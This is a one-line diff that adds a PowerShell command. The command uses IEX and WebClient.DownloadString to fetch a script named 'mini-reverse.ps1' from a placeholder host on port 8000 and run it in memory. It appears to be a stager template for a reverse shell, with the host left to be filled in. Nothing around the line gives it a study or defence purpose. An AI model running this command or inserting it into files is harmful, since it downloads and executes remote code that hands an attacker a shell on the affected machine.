@@ -1,0 +1,1 @@
+IEX(New-Object System.Net.WebClient).DownloadString('http://REPLACE_H:8000/Needs/mini-reverse.ps1')
